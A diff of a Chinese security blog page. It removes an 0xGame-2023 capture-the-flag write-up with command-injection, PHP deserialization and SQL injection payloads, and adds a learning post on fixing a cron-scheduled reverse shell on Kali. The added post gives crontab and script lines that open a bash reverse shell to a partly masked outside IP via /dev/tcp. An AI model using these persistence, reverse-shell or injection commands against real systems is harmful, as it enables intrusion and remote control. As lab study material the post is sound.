@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>0xGame-2023 | Secfeng</title>
-  <meta name="keywords" content=" 0xGame ">
-  <meta name="description" content="0xGame-2023 | Secfeng">
+  <title>定时任务反弹shell报错(CRON)info(NoMTAinstalled,discardingoutput) | Secfeng</title>
+  <meta name="keywords" content=" shell ">
+  <meta name="description" content="定时任务反弹shell报错(CRON)info(NoMTAinstalled,discardingoutput) | Secfeng">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="[TOC] 一、含义​	客户端连接服务端为正向连接（如：远程桌面、ssh等），反向连接弹shell（即反弹shell为攻击者为服务端，受害者主机为客户端主动连接攻击者的服务端） 二、适用情况​	1、目标机因防火墙受限，目标机器只能发送请求，不能接收请求 ​	2、目标机端口被占用 ​	3、目标机位于局域网 ​	4、IP会动态变化 ​	5、攻击了一台主机需要在自己的机器上交互式地执行目标机器中的cmd">
 <meta property="og:type" content="article">
@@ -530,9 +530,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-0xGame-2023" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-定时任务反弹shell报错(CRON) info (No MTA installed,discarding output)" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">0xGame-2023</h1>
+        <h1 class="article-title">定时任务反弹shell报错(CRON)info(NoMTAinstalled,discardingoutput)</h1>
     
     <div class="article-meta">
         
@@ -542,19 +542,19 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color2">0xGame</a>
+            <a class="color1">shell</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2023-10-18 13:33:11'>2023-10-02 18:30</time>
+            发布时间 : <time class="date" title='最后更新: 2024-03-28 21:56:26'>2023-10-28 19:44</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:1.7k</span>
+        <span>字数:529</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -573,7 +573,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#week1"><span class="toc-text">week1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#signin"><span class="toc-text">signin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hello-http"><span class="toc-text">hello_http</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-php"><span class="toc-text">baby_php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ping"><span class="toc-text">Ping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#repo-leak"><span class="toc-text">repo_leak</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Week2"><span class="toc-text">Week2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-upload"><span class="toc-text">ez_upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-unserialize"><span class="toc-text">ez_unserialize</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-sqli"><span class="toc-text">ez_sqli</span></a></li></ol></li></ol></li></ol>
+        
     
 <style>
     .left-col .switch-btn,
@@ -589,159 +589,50 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h1><h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><p>这道题是信息搜集，打开题目后查看源代码，有个<code>assets/index-33309f51.js</code>，打开后在页面最底部可发现一个<code>sourceMappingURL=index-33309f51.js.map</code>,猜测可能是sourcemap文件泄露</p>
-<p>将url栏中的<code>index-33309f51.js</code>用<code>index-33309f51.js.map</code>替换，即可下载文件</p>
-<p>然后用reverse-sourcemap工具还原文件</p>
-<pre><code>reverse-sourcemap -v index-33309f51.js.map -o output
+        <p>最近在学习反弹shell时遇到定时任务反弹shell没有反应的问题</p>
+<p>首先将受害机的shell修改为bash然后重启</p>
+<pre><code>usermod -s /bin/bash 用户名
 </code></pre>
-<img src="/2023/10/02/0xGame-2023/185016.png" class="">
+<p>再在受害机中添加定时任务(crontab -e)</p>
+<pre><code>*/1  *  *  *  *   /bin/bash -i&gt;&amp;/dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1#每隔一分钟，向47.xxx.xxx.72的2333号端口发送shell
+</code></pre>
+<p>攻击机开启2333端口监听</p>
+<pre><code>netcat -lvvp 2333
+</code></pre>
+<p>可是死活就是连不上，看一看cron的状态：</p>
+<img src="/2023/10/28/%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell%E6%8A%A5%E9%94%99(CRON)%20info%20(No%20MTA%20installed,discarding%20output)/195612.png" class="">
 
-<p>最后找了半天在src&#x2F;main.js里面找到了flag</p>
-<h3 id="hello-http"><a href="#hello-http" class="headerlink" title="hello_http"></a>hello_http</h3><p>这道题就是改请求包的数据</p>
-<img src="/2023/10/02/0xGame-2023/194458.png" class="">
+<p>可以看到这边日志给出的错误信息是 No MTA installed，discarding output,查了一下以为是没有安装邮件系统的原因就安装了postfix，结果没有报错了但还是连不上shell</p>
+<p>最后在<a target="_blank" rel="noopener" href="https://blog.csdn.net/sdb5858874/article/details/81837440%E9%87%8C%E7%9C%8B%E5%88%B0%E4%BA%86%E7%9C%9F%E6%AD%A3%E7%9A%84%E5%8E%9F%E5%9B%A0%E4%BB%A5%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%EF%BC%9A">https://blog.csdn.net/sdb5858874/article/details/81837440里看到了真正的原因以及解决方法：</a></p>
+<p>kali系统默认会将计划任务的错误信息以邮件的方式发送给用户，但是由于kali系统默认没有安装邮件系统，所以真正的报错信息并不是No MTA installed，discarding output这句话</p>
+<p>想看到真正的报错信息有两种解决办法：</p>
+<p><strong>1、</strong>由于我们刚才已经安装了邮件系统那么直接来看一下报错邮件：</p>
+<img src="/2023/10/28/%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell%E6%8A%A5%E9%94%99(CRON)%20info%20(No%20MTA%20installed,discarding%20output)/201801.png" class="">
 
-<h3 id="baby-php"><a href="#baby-php" class="headerlink" title="baby_php"></a>baby_php</h3><img src="/2023/10/02/0xGame-2023/194707.png" class="">
+<p><strong>2、</strong>将计划任务的错误信息输出到一个文件内</p>
+<pre><code>*/1  *  *  *  *  /bin/bash -i &#39;&gt;&amp;/dev/tcp/47.xxx.xx.xxx/2333 0&gt;&amp;1&#39; &gt;/tmp/error.txt 2&gt;&amp;1
+</code></pre>
+<img src="/2023/10/28/%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell%E6%8A%A5%E9%94%99(CRON)%20info%20(No%20MTA%20installed,discarding%20output)/203106.png" class="">
 
-<p>这道题原本思考了一下用c&#x3D;1024e2fff绕过，结果在本地可以，在靶场里就是不行，后面发现靶场用的是php7.4.27</p>
-<p>所以这道题最后用c&#x3D;1024.2fff成功绕过</p>
-<p>究其原因就是大概php7.0.9以上intval函数会自动识别字符串中的科学计数法</p>
-<p>总结一下intval常见的绕过思路：</p>
-<p><strong>int intval( $var, $base )</strong></p>
-<p>base参数可选</p>
-<p>当var为整形数字时，函数自动识别var使用的进制</p>
-<p>当var为字符串时，将base设置为0后可自动识别var使用的进制</p>
-<pre><code>绕过思路：
-1、进制自动转换
-2、数组绕过
-3、转换小数
-4、字符串整形转换（0x，0b,e）(php7.0以上已经可以识别科学计数法e)
-5、取反~ (当某个数字被过滤时，可以两次取反来绕过:intval(~~10)==intval(10))
-6、算数运算符（如果传入的 $var参数（只支持整形，不支持字符串）包含算数运算符，会先运算，再对运算结果进行转换）
-7、浮点数精度丢失问题（intval(0.58*100.0)==57）
-</code></pre>
-<h3 id="Ping"><a href="#Ping" class="headerlink" title="Ping"></a>Ping</h3><p>这道题就是命令执行</p>
-<p>抓包然后用连接符执行命令</p>
-<pre><code>（1）; //分号，没有任何逻辑关系的连接符。当多个命令用分号连接时，各命令之间的执行成功与否彼此没有任何影响，都会一条一条执行下去。
-（2）|| //逻辑或，当用此连接符连接多个命令时，前面的命令执行成功，则后面的命令不会执行。前面的命令执行失败，后面的命令才会执行。
-（3）&amp;&amp; //逻辑与，当用此连接符连接多个命令时，前面的命令执行成功，才会执行后面的命令，前面的命令执行失败，后面的命令不会执行，与 || 正好相反。
-</code></pre>
-<p>但是测试时发现&#x2F;和空格被ban了，空格可以用%09绕过，&#x2F;不能用没法跳转目录</p>
-<p>第二种方法就是写文件</p>
-<pre><code>127.0.0.1&amp;echo%09&quot;&lt;?php%09eval(&quot;ls&quot;);&quot;%09&gt;hhh.php
-</code></pre>
-<p>但是进入文件后发现报错，测试了一下发现<code>;</code>也被ban了</p>
-<p>后面才知道还有一种方法，用base64编码</p>
-<p>先将<code>&lt;?php eval(&quot;ls&quot;);</code>base64编码为PD9waHAlMDlldmFsKCJscyIpOw&#x3D;&#x3D;（注意编码后的字符串不能有加号，加号会被url解码为空格然后再ban掉）</p>
-<p>然后再使用管道连接符base64解码命令</p>
-<pre><code>127.0.0.1&amp;echo%09&quot;PD9waHAlMDlldmFsKCJscyIpOw==&quot;|base64%09-d%09&gt;hhh.php
-</code></pre>
-<pre><code>| 管道连接符，使用此管道符“|”可以将两个命令分隔开，“|”左边命令的输出就会作为“|”右边命令的输入，此命令可连续使用
-</code></pre>
-<p>后面发现这道题还可以看api.php的源码</p>
-<h3 id="repo-leak"><a href="#repo-leak" class="headerlink" title="repo_leak"></a>repo_leak</h3><p>这道题要拿githacker跑</p>
-<p>githacker –url <a target="_blank" rel="noopener" href="http://120.27.148.152:50013/.git/">http://120.27.148.152:50013/.git/</a> –output-folder result</p>
-<p>进入目录后查看历史版本 </p>
-<pre><code>git log --reflog
-</code></pre>
-<img src="/2023/10/02/0xGame-2023/200429.png" class="">
+<p>这本质上不就是shell不是bash，但我们最开始已经把系统的shell换为bashl了啊</p>
+<p>其实这里是linux里面的cron中command执行的shell环境是&#x2F;bin&#x2F;sh</p>
+<p>有两种方法改变cron执行命令的shell</p>
+<p><strong>1、改系统sh软链接</strong></p>
+<p>在&#x2F;bin目录下执行ls -l | grep -w “sh”:</p>
+<img src="/2023/10/28/%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell%E6%8A%A5%E9%94%99(CRON)%20info%20(No%20MTA%20installed,discarding%20output)/204913.png" class="">
 
-<p>切换到有flag的版本</p>
-<pre><code>git reset --hard 8a5b670558921bd232d75b29542492f00698298b
+<p>发现sh指向的其实是dash，直接修改</p>
+<pre><code>ln - s -f bash /bin/sh
 </code></pre>
-<p>在当前目录匹配包含flag的文件</p>
-<pre><code>grep -r  &quot;flag&quot; ./
+<p>成功反弹shell！</p>
+<p><strong>2、将反弹shell的语句写入脚本，然后crontab任务定时执行脚本</strong></p>
+<p>先建立一个脚本cronshell，并赋予执行权限</p>
+<pre><code>#!/bin/bash
+/bin/bash -i &gt;&amp; /dev/tcp/xxx.xx.x.xx/2333 0&gt;&amp;1
 </code></pre>
-<img src="/2023/10/02/0xGame-2023/201628.png" class="">
+<p>然后修改计划任务*</p>
+<img src="/2023/10/28/%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell%E6%8A%A5%E9%94%99(CRON)%20info%20(No%20MTA%20installed,discarding%20output)/215527.png" class="">
 
-
-
-<h1 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h1><h3 id="ez-upload"><a href="#ez-upload" class="headerlink" title="ez_upload"></a>ez_upload</h3><p>这道题给了源码，看了一下是二次渲染，那么最简单的方法就是上传一个能绕过二次渲染的gif</p>
-<p>一般要通过文件包含才能rce，但这道题没有文件包含，后面才发现这道题判断文件类型的时候是判断的MIME，也就是只需修改Content-Type为image&#x2F;gif，文件后缀改为php</p>
-<img src="/2023/10/02/0xGame-2023/184321.png" class="">
-
-<h3 id="ez-unserialize"><a href="#ez-unserialize" class="headerlink" title="ez_unserialize"></a>ez_unserialize</h3><p>php反序列化</p>
-<p>直接上payload</p>
-<pre><code>&lt;?php
-highlight_file(__FILE__);
-class Cache &#123;
-    public $key;
-    public $expired;
-    public $helper;
-    public function __wakeup() &#123;
-        $this-&gt;expired = False;
-    &#125;
-    public function expired() &#123;
-        if ($this-&gt;expired) &#123;
-            $this-&gt;helper-&gt;clean($this-&gt;key);
-            return True;
-        &#125; else &#123;
-            return False;
-        &#125;
-    &#125;
-&#125;
-class Storage &#123;
-    public $store;
-    public function __set($name, $value) &#123;
-        if (!$this-&gt;store) &#123;
-            $this-&gt;store = array();
-        &#125;
-        if (!$value-&gt;expired()) &#123;
-            $this-&gt;store[$name] = $value;
-        &#125;
-    &#125;
-    public function __get($name) &#123;
-        return $this-&gt;data[$name];
-    &#125;
-&#125;
-class Helper &#123;
-    public $funcs;
-    public function __call($name, $args) &#123;
-        $this-&gt;funcs[$name](...$args);
-    &#125;
-&#125;
-class DataObject &#123;
-    public $storage;
-    public $data;
-    public function __destruct() &#123;
-        foreach ($this-&gt;data as $key =&gt; $value) &#123;
-            $this-&gt;storage-&gt;$key = $value;
-        &#125;
-    &#125;
-&#125;
-$a=new Storage();
-$b=new Helper();
-$b-&gt;funcs=array(&quot;clean&quot;=&gt;&quot;phpinfo&quot;);
-$c=new Cache();
-$c-&gt;expired=True;
-$c-&gt;helper=$b;
-$c-&gt;key=-1;
-$d=new DataObject();
-$d-&gt;storage=$a;
-$d-&gt;data=array(&quot;data&quot;=&gt;$c);
-echo serialize($d);
-//?u=O:10:&quot;DataObject&quot;:3:&#123;s:7:&quot;storage&quot;;O:7:&quot;Storage&quot;:1:&#123;s:5:&quot;store&quot;;N;&#125;s:4:&quot;data&quot;;a:1:&#123;s:4:&quot;data&quot;;O:5:&quot;Cache&quot;:3:&#123;s:3:&quot;key&quot;;i:-1;s:7:&quot;expired&quot;;b:1;s:6:&quot;helper&quot;;O:6:&quot;Helper&quot;:1:&#123;s:5:&quot;funcs&quot;;a:1:&#123;s:5:&quot;clean&quot;;s:7:&quot;phpinfo&quot;;&#125;&#125;&#125;&#125;&#125;
-</code></pre>
-<p>这道题要设置属性个数比实际属性个数多绕过__wakeup()，在测试的时候，发现修改DataObject或Cache的属性个数都可以</p>
-<h3 id="ez-sqli"><a href="#ez-sqli" class="headerlink" title="ez_sqli"></a>ez_sqli</h3><p>根据提示，这道题要用堆叠注入，并且堆叠注入在前面语句有回显的情况下没法回显</p>
-<p>所以要配合报错注入或盲注，并且源码中屏蔽了很多关键词，所以用使用预处理语句</p>
-<p>通过测试，发现空格也被屏蔽了，可以用&#x2F;**&#x2F;绕过</p>
-<pre><code>id;sEt@a=concat(&quot;sel&quot;,&quot;ect/**/&quot;,&quot;extractvalue(1,concat(0x7e,(&quot;,&quot;sel&quot;,&quot;ect/**/&quot;,&quot;flag/**/&quot;,&quot;from/**/&quot;,&quot;flag/**/limit/**/&quot;,&quot;0,1)))&quot;);PRepare/**/hello/**/from/**/@a;execute/**/hello;
-</code></pre>
-<p>也可以直接用char函数来拼接ascii：</p>
-<pre><code>m=&quot;select extractvalue(1,concat(0x7e,(select flag from flag limit 0,1)))&quot;
-char=&quot;&quot;
-for i in range(0,len(m)):
-    char+=&quot;char(&quot;+str(ord(m[i]))+&quot;),&quot;
-print(char)
-</code></pre>
-<p>payload</p>
-<pre><code>id;set@sql=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(101),char(120),char(116),char(114),char(97),char(99),char(116),char(118),char(97),char(108),char(117),char(101),char(40),char(49),char(44),char(99),char(111),char(110),char(99),char(97),char(116),char(40),char(48),char(120),char(55),char(101),char(44),char(40),char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(102),char(108),char(97),char(103),char(32),char(102),char(114),char(111),char(109),char(32),char(102),char(108),char(97),char(103),char(32),char(108),char(105),char(109),char(105),char(116),char(32),char(48),char(44),char(49),char(41),char(41),char(41));prepare/**/s1/**/from/**/@sql;execute/**/s1;
-</code></pre>
-<img src="/2023/10/02/0xGame-2023/132036.png" class="">
-
-<p>没显示完全，用right</p>
-<pre><code>select extractvalue(1,concat(0x7e,right((select flag from flag limit 0,1),30)))
-</code></pre>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
